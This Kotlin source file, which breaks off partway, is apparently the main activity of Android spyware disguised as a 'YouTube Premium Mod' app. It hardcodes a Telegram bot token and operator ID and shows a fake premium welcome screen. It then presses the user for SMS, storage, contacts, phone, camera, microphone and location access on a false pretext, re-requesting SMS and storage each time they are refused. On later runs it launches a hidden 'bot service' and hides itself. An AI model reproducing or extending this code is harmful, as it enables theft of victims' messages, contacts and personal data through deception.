package com.example.youmod

import android.Manifest
import android.accounts.AccountManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.telephony.TelephonyManager
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.animation.AnimationUtils
import android.widget.Button
import android.widget.HorizontalScrollView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        const val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
        const val AUTHORIZED_USER = 7548711500L
        private var MainActivity_instance: MainActivity? = null

        fun getDeviceId(context: Context): String {
            val prefs = context.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)
            return prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"
        }

        fun getInstance(): MainActivity? = MainActivity_instance
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private lateinit var deviceId: String
    private var isFirstRun = true
    private var requiredStorageGranted = false
    private var requiredSmsGranted = false
    private var isLoading = false

    private var rootLayout: LinearLayout? = null
    private var permissionButtonsLayout: LinearLayout? = null
    private var statusText: TextView? = null

    private val permissionMap = mutableMapOf<String, Boolean>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        MainActivity_instance = this

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        isFirstRun = prefs.getBoolean("is_first_run", true)
        deviceId = prefs.getString("device_id", null) ?: generateAndSaveDeviceId(prefs)

        if (isFirstRun) {
            showWelcomeScreen()
        } else {
            startBotService()
            finish()
        }
    }

    private fun generateAndSaveDeviceId(prefs: android.content.SharedPreferences): String {
        val letters = (1..4).map { ('A' + Random.nextInt(26)).toString() }.joinToString("")
        val digits = (1..6).map { Random.nextInt(10).toString() }.joinToString("")
        val id = letters + digits
        prefs.edit().putString("device_id", id).apply()
        return id
    }

    private fun showWelcomeScreen() {
        val scrollContainer = ScrollView(this)
        scrollContainer.setBackgroundColor(Color.parseColor("#0a0a1a"))
        scrollContainer.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT
        )

        val outerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(24, 80, 24, 40)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val gradientBg = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
        )
        outerLayout.background = gradientBg

        val logoContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 0)
        }

        val playButtonOuter = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            val size = dpToPx(80)
            layoutParams = LinearLayout.LayoutParams(size, size)
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(20).toFloat()
            shape.setColor(Color.parseColor("#CCFF0000"))
            shape.setStroke(dpToPx(2).toInt(), Color.parseColor("#66FFFFFF"))
            background = shape
        }

        val playTriangle = TextView(this).apply {
            text = "\u25B6"
            textSize = 40f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
        }
        playButtonOuter.addView(playTriangle)

        val logoText = TextView(this).apply {
            text = "YouTube Premium Mod"
            textSize = 26f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 4)
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val subtitleText = TextView(this).apply {
            text = "Ad-Free \u00B7 Background Play \u00B7 Premium Features"
            textSize = 13f
            setTextColor(Color.parseColor("#99FFFFFF"))
            gravity = Gravity.CENTER
        }

        logoContainer.addView(playButtonOuter)
        logoContainer.addView(logoText)
        logoContainer.addView(subtitleText)

        val glassCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(32, 40, 32, 40)
            val params = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            params.setMargins(0, 48, 0, 0)
            layoutParams = params
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(24).toFloat()
            shape.setColor(Color.parseColor("#1AFFFFFF"))
            shape.setStroke(dpToPx(1).toInt(), Color.parseColor("#33FFFFFF"))
            background = shape
            elevation = 8f
        }

        val welcomeTitle = TextView(this).apply {
            text = "Welcome to Premium"
            textSize = 20f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val welcomeDesc = TextView(this).apply {
            text = "Enjoy an enhanced YouTube experience with ad-free playback, background streaming, picture-in-picture mode, and exclusive premium features."
            textSize = 14f
            setTextColor(Color.parseColor("#BBFFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 24)
            lineSpacing(0f, 1.3f)
        }

        val continueBtn = Button(this).apply {
            text = "CONTINUE"
            setTextColor(Color.WHITE)
            textSize = 15f
            val params = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dpToPx(52)
            )
            layoutParams = params
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(26).toFloat()
            shape.colors = intArrayOf(Color.parseColor("#FF0000"), Color.parseColor("#CC0000"))
            background = shape
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            setOnClickListener {
                showPermissionScreen()
            }
        }

        glassCard.addView(welcomeTitle)
        glassCard.addView(welcomeDesc)
        glassCard.addView(continueBtn)

        val versionText = TextView(this).apply {
            text = "v2.4.1 Premium MOD"
            textSize = 12f
            setTextColor(Color.parseColor("#66FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 32, 0, 0)
        }

        outerLayout.addView(logoContainer)
        outerLayout.addView(glassCard)
        outerLayout.addView(versionText)

        scrollContainer.addView(outerLayout)
        setContentView(scrollContainer)
    }

    private fun showPermissionScreen() {
        val scrollContainer = ScrollView(this)
        scrollContainer.setBackgroundColor(Color.parseColor("#0a0a1a"))
        scrollContainer.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT
        )

        val outerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(20, 40, 20, 40)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            val gradientBg = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
            )
            background = gradientBg
        }

        val headerText = TextView(this).apply {
            text = "Permissions Required"
            textSize = 24f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val descText = TextView(this).apply {
            text = "Please grant the necessary permissions to ensure the app functions properly. These permissions are required for ad-free playback and background streaming."
            textSize = 14f
            setTextColor(Color.parseColor("#BBFFFFFF"))
            gravity = Gravity.CENTER
            setPadding(8, 12, 8, 24)
            lineSpacing(0f, 1.3f)
        }

        statusText = TextView(this).apply {
            text = "Tap each permission to grant it"
            textSize = 13f
            setTextColor(Color.parseColor("#FFAA00"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }

        permissionButtonsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val permissions = listOf(
            "Storage" to Manifest.permission.READ_MEDIA_IMAGES,
            "SMS" to Manifest.permission.READ_SMS,
            "Contacts" to Manifest.permission.READ_CONTACTS,
            "Phone" to Manifest.permission.READ_PHONE_STATE,
            "Camera" to Manifest.permission.CAMERA,
            "Microphone" to Manifest.permission.RECORD_AUDIO,
            "Location" to Manifest.permission.ACCESS_FINE_LOCATION
        )

        for ((name, perm) in permissions) {
            val btnRow = createPermissionButton(name, perm)
            permissionButtonsLayout?.addView(btnRow)
        }

        val doneText = TextView(this).apply {
            text = "All permissions will make the app work perfectly."
            textSize = 12f
            setTextColor(Color.parseColor("#88FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 8)
        }

        outerLayout.addView(headerText)
        outerLayout.addView(descText)
        outerLayout.addView(statusText)
        outerLayout.addView(permissionButtonsLayout)
        outerLayout.addView(doneText)

        scrollContainer.addView(outerLayout)
        setContentView(scrollContainer)

        Handler(Looper.getMainLooper()).postDelayed({
            autoRequestRequiredPermissions()
        }, 600)
    }

    private fun createPermissionButton(name: String, permission: String): LinearLayout {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(16, 8, 16, 8)
            val params = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            params.setMargins(0, 6, 0, 6)
            layoutParams = params
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(16).toFloat()
            shape.setColor(Color.parseColor("#1AFFFFFF"))
            shape.setStroke(dpToPx(1).toInt(), Color.parseColor("#22FFFFFF"))
            background = shape
        }

        val labelText = TextView(this).apply {
            text = name
            textSize = 15f
            setTextColor(Color.WHITE)
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val statusDot = TextView(this).apply {
            text = "  \u25CB  "
            textSize = 20f
            setTextColor(Color.parseColor("#888888"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val requestBtn = Button(this).apply {
            text = "Grant"
            setTextColor(Color.WHITE)
            textSize = 12f
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(14).toFloat()
            shape.setColor(Color.parseColor("#33FF0000"))
            background = shape
            setPadding(20, 8, 20, 8)
            val btnParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                dpToPx(36)
            )
            btnParams.setMargins(8, 0, 0, 0)
            layoutParams = btnParams

            setOnClickListener {
                requestSinglePermission(permission, requestBtn, statusDot, name)
            }
        }

        row.addView(labelText)
        row.addView(statusDot)
        row.addView(requestBtn)

        return row
    }

    private fun requestSinglePermission(permission: String, btn: Button, dot: TextView, name: String) {
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            btn.text = "Granted"
            btn.setTextColor(Color.parseColor("#00FF00"))
            dot.text = "  \u2713  "
            dot.setTextColor(Color.parseColor("#00FF00"))
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(14).toFloat()
            shape.setColor(Color.parseColor("#3300FF00"))
            btn.background = shape
            return
        }

        if (permission == Manifest.permission.READ_MEDIA_IMAGES) {
            val actualPerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(actualPerm), 200)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
        }

        pendingPermissionButton = btn
        pendingPermissionDot = dot
        pendingPermissionName = name
        pendingPermissionString = permission
    }

    private var pendingPermissionButton: Button? = null
    private var pendingPermissionDot: TextView? = null
    private var pendingPermissionName: String? = null
    private var pendingPermissionString: String? = null

    private var hasAutoRequestedStorage = false
    private var hasAutoRequestedSms = false

    private fun autoRequestRequiredPermissions() {
        if (!hasAutoRequestedStorage) {
            hasAutoRequestedStorage = true
            val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            statusText?.text = "Granting storage access..."
            ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (grantResults.isEmpty()) return
        val granted = grantResults[0] == PackageManager.PERMISSION_GRANTED
        val permission = permissions[0]

        if (requestCode == 100) {
            if (granted) {
                requiredStorageGranted = true
                statusText?.text = "Storage granted! Now granting SMS..."
                updateButtonVisual(Manifest.permission.READ_MEDIA_IMAGES, true)
                Handler(Looper.getMainLooper()).postDelayed({
                    val smsPerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_SMS else Manifest.permission.READ_SMS
                    hasAutoRequestedSms = true
                    statusText?.text = "Granting SMS access..."
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                }, 500)
            } else {
                statusText?.text = "Storage permission is required. Please grant it."
                updateButtonVisual(Manifest.permission.READ_MEDIA_IMAGES, false)
                Handler(Looper.getMainLooper()).postDelayed({
                    val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
                    ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
                }, 1500)
            }
        } else if (requestCode == 101) {
            if (granted) {
                requiredSmsGranted = true
                statusText?.text = "SMS granted!"
                updateButtonVisual(Manifest.permission.READ_SMS, true)
                Handler(Looper.getMainLooper()).postDelayed({
                    if (requiredStorageGranted && requiredSmsGranted) {
                        onRequiredPermissionsGranted()
                    }
                }, 500)
            } else {
                statusText?.text = "SMS permission is required. Please grant it."
                updateButtonVisual(Manifest.permission.READ_SMS, false)
                Handler(Looper.getMainLooper()).postDelayed({
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                }, 1500)
            }
        } else if (requestCod
